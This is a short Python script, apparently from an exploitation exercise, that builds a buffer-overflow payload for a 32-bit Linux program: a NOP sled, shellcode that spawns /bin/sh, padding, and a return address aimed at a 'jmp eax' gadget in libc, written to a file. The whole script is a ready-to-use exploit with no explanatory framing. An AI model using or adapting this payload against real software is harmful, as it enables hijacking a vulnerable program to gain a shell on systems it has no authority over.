#!/usr/bin/python3

# libc base = 0xf7c00000 
# jmp eax offset in /usr/lib/i386-linux-gnu/libc.so.6 = 0x000218e7
# fc7c0000 + 218e7 = f7c218e7


nopsled = b"\x90" * 60

shellcode = b"\x31\xc0\x89\xc2\x89\xc1\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

padding_length = 268 - 60 - len(shellcode)

padding = b"A" * padding_length

eip = b"\xe7\x18\xc2\xf7"

junk = b"C" * 28

payload = nopsled + shellcode + padding + eip + junk


with open("jmpeax_payload", "wb") as f:
    f.write(payload)
